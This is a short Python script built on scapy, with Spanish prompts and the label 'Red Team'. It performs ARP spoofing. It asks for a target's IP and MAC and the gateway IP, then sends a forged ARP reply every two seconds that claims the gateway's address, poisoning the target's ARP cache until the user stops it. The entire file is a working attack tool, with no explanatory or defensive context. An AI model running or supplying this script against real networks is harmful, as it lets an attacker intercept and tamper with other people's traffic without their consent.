from scapy.all import ARP, Ether, send
import time
import sys

def arp_spoofing(targetIP, targetMAC, spoofIP):
    print(f"Enviando un paquete ARP a {targetIP}")
    paquete = Ether(dst=targetMAC) / ARP(op=2, pdst=targetIP, hwdst=targetMAC, psrc=spoofIP)
    send(paquete, verbose=False)

if __name__ == "__main__":
    print("ARP Spoofing del Red Team")
    print("Ejecutar con privilegios sudo.")

    targetIP = input("Ingrese la IP objetivo: ")
    targetMAC = input("Ingrese la MAC del objetivo: ")
    gatewayIP = input("Ingrese la IP del Gateway de la red: ")

    print(f"Iniciando el ataque ARP Spoofing a {targetIP}")
    print("Utilice CTRL + C si desea detener el ataque.\n")

    try:
        while True:
            arp_spoofing(targetIP, targetMAC, gatewayIP)
            time.sleep(2)
    except KeyboardInterrupt:
        print("El ataque se detuvo")
